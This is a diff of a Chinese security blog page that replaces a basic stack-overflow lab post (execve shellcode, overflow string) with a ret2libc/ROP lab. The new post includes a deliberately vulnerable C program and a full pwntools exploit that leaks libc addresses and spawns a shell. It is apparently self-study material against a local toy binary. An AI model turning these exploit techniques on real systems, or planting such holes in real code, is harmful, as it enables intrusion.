@@ -109,34 +109,30 @@
 
 
 
-  <meta name="description" content="目的 理解掌握C 栈帧结构 Shellcode 构造 加深理解栈溢出攻击原理及防护措施  要求 在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击 开启安全保护机制,运行一样的溢出攻击代码,比较实现现象">
-<meta name="keywords" content="栈溢出">
+  <meta name="description" content="准备工作 实验环境：uname -a    64位 ubuntu 16.04 Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux   gdb-peda  12$ git clone https://github.com/longld/pe">
+<meta name="keywords" content="栈溢出 ret2libc rop">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基础栈溢出">
-<meta property="og:url" content="https://xsyin.github.io/2018/05/01/基础栈溢出/index.html">
+<meta property="og:title" content="高级栈溢出及ret2libc">
+<meta property="og:url" content="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/index.html">
 <meta property="og:site_name" content="Xsyin&#39;s Blog">
-<meta property="og:description" content="目的 理解掌握C 栈帧结构 Shellcode 构造 加深理解栈溢出攻击原理及防护措施  要求 在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击 开启安全保护机制,运行一样的溢出攻击代码,比较实现现象">
+<meta property="og:description" content="准备工作 实验环境：uname -a    64位 ubuntu 16.04 Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux   gdb-peda  12$ git clone https://github.com/longld/pe">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_025.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_028.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_029.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_031.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_032.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_033.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_034.png">
-<meta property="og:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_035.png">
-<meta property="og:updated_time" content="2018-05-01T02:53:54.000Z">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/选区_065.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/选区_066.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/选区_067.png">
+<meta property="og:image" content="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/选区_068.png">
+<meta property="og:updated_time" content="2018-05-05T01:38:08.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="基础栈溢出">
-<meta name="twitter:description" content="目的 理解掌握C 栈帧结构 Shellcode 构造 加深理解栈溢出攻击原理及防护措施  要求 在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击 开启安全保护机制,运行一样的溢出攻击代码,比较实现现象">
-<meta name="twitter:image" content="https://xsyin.github.io/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_025.png">
+<meta name="twitter:title" content="高级栈溢出及ret2libc">
+<meta name="twitter:description" content="准备工作 实验环境：uname -a    64位 ubuntu 16.04 Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux   gdb-peda  12$ git clone https://github.com/longld/pe">
+<meta name="twitter:image" content="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/选区_065.png">
 
 
 
 
 
 
-  <link rel="canonical" href="https://xsyin.github.io/2018/05/01/基础栈溢出/"/>
+  <link rel="canonical" href="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/"/>
 
 
 
@@ -146,7 +142,7 @@
   };
 </script>
 
-  <title>基础栈溢出 | Xsyin's Blog</title>
+  <title>高级栈溢出及ret2libc | Xsyin's Blog</title>
   
 
 
@@ -361,7 +357,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://xsyin.github.io/2018/05/01/基础栈溢出/">
+    <link itemprop="mainEntityOfPage" href="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Xsyin">
@@ -378,7 +374,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">基础栈溢出
+          <h1 class="post-title" itemprop="name headline">高级栈溢出及ret2libc
               
             
           </h1>
@@ -403,7 +399,7 @@
                 
               
 
-              <time title="创建时间：2018-05-01 10:53:54" itemprop="dateCreated datePublished" datetime="2018-05-01T10:53:54+08:00">2018-05-01</time>
+              <time title="创建时间：2018-05-05 09:38:08" itemprop="dateCreated datePublished" datetime="2018-05-05T09:38:08+08:00">2018-05-05</time>
             
 
             
@@ -458,7 +454,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.8k</span>
+                <span title="本文字数">4k</span>
               
 
               
@@ -472,7 +468,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">3 分钟</span>
+                <span title="阅读时长">4 分钟</span>
               
             </div>
           
@@ -493,62 +489,68 @@
       
 
       
-        <h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul>
-<li>理解掌握<code>C</code> 栈帧结构</li>
-<li><code>Shellcode</code> 构造</li>
-<li>加深理解栈溢出攻击原理及防护措施</li>
+        <h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><blockquote>
+<p>实验环境：uname -a    64位 ubuntu 16.04</p>
+<p>Linux ubuntu 4.4.0-122-generic #146-Ubuntu SMP Mon Apr 23 15:34:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</p>
+</blockquote>
+<ul>
+<li>gdb-peda</li>
 </ul>
-<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul>
-<li>在关闭安全机制下,在Linux系统平台上实现缓冲区溢出攻击</li>
-<li>开启安全保护机制,运行一样的溢出攻击代码,比较实现现象</li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">$ echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
+<ul>
+<li>pwntools</li>
 </ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install pwn</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>​      <code>C</code> 栈帧结构如下：</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_025.png" alt="区_02"></p>
-<p>​         因此当当前帧的局部变量和临时变量超出区域，覆盖了<code>ebp</code> 和返回地址时，就实现了栈溢出攻击。再通过精心设计返回地址，使其为<code>Shellcode</code> 的起始地址，就完成了运行流的劫持。</p>
-<p>​      实例基于 64位 <code>Ubuntu \ 16.04</code> 操作系统版本以及 <code>gcc,gdb</code> 版本信息如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609</span><br><span class="line"></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>Shellcode</code>  代码</li>
+<h3 id="三种保护机制"><a href="#三种保护机制" class="headerlink" title="三种保护机制"></a>三种保护机制</h3><ul>
+<li><strong>ASLR</strong> ：地址空间随机化，每次运行函数地址改变。</li>
 </ul>
-<p>​       <code>Shellcode</code> 是一段攻击者精心设计的恶意代码，通常要求与位置无关，且本实验中利用 <code>strcpy()</code> 函数，因此<code>Shellcode</code>  代码中不能出现  <code>\x00</code> ，会被当作<code>\0</code>从而结束拷贝。</p>
-<p>​       编写<code>Shellcode</code> ，该<code>shellcode</code> 调用<code>execve(&quot;/bin/sh&quot;,NULL)</code> ，启动一个新的<code>shell</code>，验证其功能，参考: <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a> ，编写汇编文件如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    # char *const argv[]</span><br><span class="line">    xorl %esi, %esi</span><br><span class="line"> </span><br><span class="line">    # &apos;h&apos; &apos;s&apos; &apos;/&apos; &apos;/&apos; &apos;n&apos; &apos;i&apos; &apos;b&apos; &apos;/&apos;</span><br><span class="line">    movq `0x68732f2f6e69622f, %rbx</span><br><span class="line"> </span><br><span class="line">    # for &apos;\x00&apos;</span><br><span class="line">    pushq %rsi</span><br><span class="line">    pushq %rbx</span><br><span class="line">    pushq %rsp</span><br><span class="line">    </span><br><span class="line">    # const char *filename</span><br><span class="line">    popq %rdi</span><br><span class="line"> </span><br><span class="line">    # __NR_execve 59</span><br><span class="line">    pushq `59</span><br><span class="line">    popq %rax</span><br><span class="line"> </span><br><span class="line">    # char *const envp[]</span><br><span class="line">    xorl %edx, %edx</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_028.png" alt="区_02"></p>
-<p>   提取机器码：</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_029.png" alt="区_02"></p>
+<p>​        绕过：随机化只是将每次库函数加载地址随机，库函数间相对地址不变，因此通过GOT来泄漏库函数地址，  以推导出libc中其他函数（如system）的地址。</p>
 <ul>
-<li>漏洞代码</li>
+<li><strong>NX</strong> ：通过在页表上设置NX(不可执行）位，将非代码段的地址空间设置成不可执行属性，一旦系统从这些地址空间进行取指令时，CPU就是报内存违例异常，进而杀死进程。栈空间也被操作系统设置了不可执行属性，因此普通的<code>shellode</code>注入无法执行。</li>
 </ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">60</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"</span></span><br><span class="line">                  <span class="string">"\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span>;</span><br><span class="line">    overflow(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>​       上面这段程序栈溢出漏洞触发点在<code>strcpy</code>函数, 函数没有做边界检查，可导致栈溢出覆盖返回地址。成功利用栈溢出需要确定覆盖多少个字节可以覆盖到返回地址。因此在<code>gdb</code>调试时确定<code>shellcode</code>的地址即<code>str</code>复制后<code>buf</code>的首地址，让返回地址指向该地址。</p>
+<p>​        绕过：<code>ret2libc</code> 利用已有代码，更改返回地址时返回到系统函数。</p>
 <ul>
-<li>结果</li>
+<li><strong>Cannary</strong>  ： 通过在缓冲区和返回地址间插入一个<code>canary word</code> ，当缓冲区被溢出时，在返回地址被覆盖之前 canary word 会首先被覆盖。通过检查 canary word 的值是否被修改，就可以判断是否发生了溢出攻击。</li>
 </ul>
-<p>​  为了更简单的方式实现栈溢出，需要关闭一些保护措施。</p>
+<p>​       暂时未研究如何绕过，因此使用<code>-fno-stack-protector</code> 标志关闭该安全保护机制。        </p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><strong>难点：</strong> </p>
+<ol>
+<li>由于ASLR机制，需要泄漏库函数地址以确定<code>system</code> 函数地址，本次结合<code>ROP</code> 使用<code>write</code> 函数获取<code>write</code> 函数实际地址。</li>
+<li>由于操作环境为64位<code>linux</code> ，函数通过<code>rdi,rsi,rdx,rcx,r8,r9</code> 以及栈传参，因此采用<code>pop,ret</code> 片段装填参数</li>
+</ol>
+<p>​    本次实验结合了<code>ret2libc</code> 与<code>ROP</code> 两种手段，为简化操作，内置了需要的<code>gadget</code> 。</p>
+<h3 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************************************</span></span><br><span class="line"><span class="comment">    &gt; File Name: vuln.c</span></span><br><span class="line"><span class="comment">    &gt; Author: xsyin</span></span><br><span class="line"><span class="comment">    &gt; Mail: shouyinXu@163.com </span></span><br><span class="line"><span class="comment">    &gt; Created Time: 2018年05月05日 星期六 14时24分14秒</span></span><br><span class="line"><span class="comment">    &gt; Make: gcc -fno-stack-protector -g vuln.c -o vuln</span></span><br><span class="line"><span class="comment"> ************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">helper</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">"pop %rdi; pop %rsi; pop %rdx; ret"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">128</span>);</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">"Enter input: \n"</span>,<span class="number">14</span>);</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vuln();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>read</code> 函数中允许写入521字节到一个只有128字节的缓冲区，明显的缓冲区溢出利用点。</p>
 <ul>
-<li><p><code>ASLR</code> (地址空间布局随机化)</p>
-<p>关闭<code>ASLR</code>：<code>echo 0 |sudo tee /proc/sys/kernel/randomize_va_space</code></p>
-</li>
-<li><p><code>Cannary</code>  金丝雀</p>
-<p>开启<code>Canary</code>之后，函数开始时在ebp和临时变量之间插入一个随机值，函数结束时验证这个值。如果不相等（也就是这个值被其他值覆盖了），就会调用 <code>_stackchk_fail</code>函数，终止进程。对应GCC编译选项<code>-fno-stack-protector</code>解除该保护。</p>
-</li>
-<li><p><code>NX</code><br>开启<code>NX</code>保护之后，程序的堆栈将会不可执行。对应GCC编译选项<code>-z execstack</code>解除该保护。    </p>
-</li>
+<li>寻找溢出点</li>
 </ul>
-<p>编译调试：</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_031.png" alt="区_03"></p>
-<p>​       从调试结果可知，<code>buf</code> 的首地址为 <code>0x7fffffffdaa0</code> ，且查看内存该地址处确实为 <code>Shellcode</code> 起始代码。为了覆盖到返回地址，即填充字节至且包括8字节<code>rbp</code> (<code>0x7fffffffdac0</code>) ，则除了<code>shellcode</code>外还需要填充17字节。另外返回地址为<code>0x7fffffffdaa0</code>,改为小端模式<code>\xa0\xda\xff\xff\xff\x7f</code>。因此：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[<span class="number">60</span>]=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span></span><br><span class="line">              <span class="string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">              <span class="string">"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"</span></span><br><span class="line">              <span class="string">"\xa0\xda\xff\xff\xff\x7f\x00\x00"</span>;</span><br></pre></td></tr></table></figure>
-<p>​     重新编译，gdb调试运行：</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_032.png" alt="区_03"></p>
-<p> 成功运行。然而实际运行却是段错误，原因是gdb有自己的变量环境，变量的存放地址和程序实际运行会不一致，因此只需要把返回地址改为shellcode实际存放的地址即可，填充长度无须改变，因为相对偏移不变。</p>
-<p>获取<code>shellcode</code> 实际地址，可以打印出<code>buf</code> 地址，也可以利用内核转储获取真实地址。首先启用内核转储 <code>ulimit -c unlimited</code>  ，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_033.png" alt="区_03"></p>
-<p>因此修改<code>str</code> 尾部为<code>\x10\xdb\xff\xff\xff\x7f\x00\x00</code>。重新编译运行：</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_034.png" alt="区_03"></p>
-<p>若启用保护措施，正常编译：</p>
-<p><img src="/2018/05/01/基础栈溢出/%E9%80%89%E5%8C%BA_035.png" alt="区_03"></p>
+<p><img src="/2018/05/05/高级栈溢出及ret2libc/选区_065.png" alt="选区_065"></p>
+<p><img src="/2018/05/05/高级栈溢出及ret2libc/选区_066.png" alt="选区_066"></p>
+<p>溢出点在偏移136处，即<code>buf</code> 填充136之后为返回地址。</p>
+<ul>
+<li>寻找需要的<code>gadget</code> 片段</li>
+</ul>
+<p><img src="/2018/05/05/高级栈溢出及ret2libc/选区_067.png" alt="选区_067"></p>
+<ul>
+<li>构造<code>payload</code> ：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#payload1 获取write函数实际地址</span><br><span class="line">payload1 = &quot;A&quot; * 136  #截至返回地址前的缓冲区长度</span><br><span class="line">payload1 += p64(pppr) #跳转到PPPR指令序列，为write函数赋值</span><br><span class="line">payload1 += p64(0x1) #write函数的第一个参数，1表示输出到stdout</span><br><span class="line">payload1 += p64(got_write) #write函数的第二个参数，表示要输出字符串的首地址</span><br><span class="line">payload1 += p64(0x8) #write函数的第三个参数，表示要输出字符串的长度</span><br><span class="line">payload1 += p64(plt_write) #调用write函数</span><br><span class="line">payload1 += p64(vuln)      #继续调用vuln函数</span><br></pre></td></tr></table></figure>
+<p>由于<code>linux</code> 共享库的延迟绑定技术，函数第一次调用时填充<code>GOT</code>表，在运行到<code>read</code> 函数时<code>write</code> 函数<code>GOT</code> 表中已填入实际地址。<code>payload1</code> 读取该地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#payload2 跳转至库函数system</span><br><span class="line">payload2 = &quot;A&quot; * 136   #截至返回地址前的缓冲区长度</span><br><span class="line">payload2 += p64(pr)   #跳转到PR指令序列，填充system的第一个参数</span><br><span class="line">payload2 += p64(binsh_addr)  #system函数的第一个参数/bin/sh</span><br><span class="line">payload2 += p64(systemAddr)    #调用system函数</span><br></pre></td></tr></table></figure>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/2018/05/05/高级栈溢出及ret2libc/选区_068.png" alt="选区_068"></p>
+<p>退出报错，可以通过PPPR片段再次跳转到<code>exit</code> 函数正常退出。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> <strong>优点：</strong>  通过<code>ret2libc</code> 与 <code>ROP</code> 绕过了ASLR与NX机制</p>
+<p><strong>缺点：</strong> </p>
+<ol>
+<li>未绕过GS机制，可通过更改__check_stack_</li>
+</ol>
+<ol start="2">
+<li>内置了需要的<code>gadget</code> ，可使用通用的片段，ret2csu</li>
+<li>需要知道 <code>libc</code> 路径及版本，可通过pwntools提供的DynELF模块来进行内存搜索</li>
+</ol>
+<h3 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># file: exploit.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'vuln'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line"></span><br><span class="line">pppr = <span class="number">0x4005ba</span></span><br><span class="line">pr = <span class="number">0x400693</span></span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_system: "</span>+hex(libc_system)</span><br><span class="line"></span><br><span class="line">vuln = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload1 += p64(pppr)</span><br><span class="line">payload1 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload1 += p64(got_write)</span><br><span class="line">payload1 += p64(<span class="number">0x8</span>)</span><br><span class="line">payload1 += p64(plt_write)</span><br><span class="line">payload1 += p64(vuln)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter input:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"################ send payload1 ###########"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">writeAddrTmp = struct.unpack(<span class="string">'&lt;Q'</span>, p.recv(<span class="number">8</span>)[<span class="number">-8</span>::])</span><br><span class="line">writeAddr = writeAddrTmp[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"writeAddr:"</span>, hex(writeAddr)</span><br><span class="line"></span><br><span class="line">systemAddr = (writeAddr - libc_write) + libc_system</span><br><span class="line"><span class="keyword">print</span> <span class="string">"systemAddr:"</span>, hex(systemAddr)</span><br><span class="line"></span><br><span class="line">binsh_addr = (writeAddr - libc_write) + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr:"</span>, hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">136</span></span><br><span class="line">payload2 += p64(pr)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(systemAddr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Enter input:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"################ send payload2 ###########"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://jaq.alibaba.com/community/art/show?articleid=473" target="_blank" rel="noopener">一步一步学ROP之linux_x64篇</a></p>
 
       
     </div>
@@ -574,6 +576,35 @@
     
       <div>
         
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/05/05/高级栈溢出及ret2libc/">高级栈溢出及ret2libc</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Xsyin 的个人博客">Xsyin</a></p>
+  <p><span>发布时间:</span>2018年05月05日 - 09:05</p>
+  <p><span>最后更新:</span>2018年05月05日 - 09:05</p>
+  <p><span>原始链接:</span><a href="/2018/05/05/高级栈溢出及ret2libc/" title="高级栈溢出及ret2libc">https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://xsyin.github.io/2018/05/05/高级栈溢出及ret2libc/"  aria-label="复制成功！"></i></span>
+  </p>
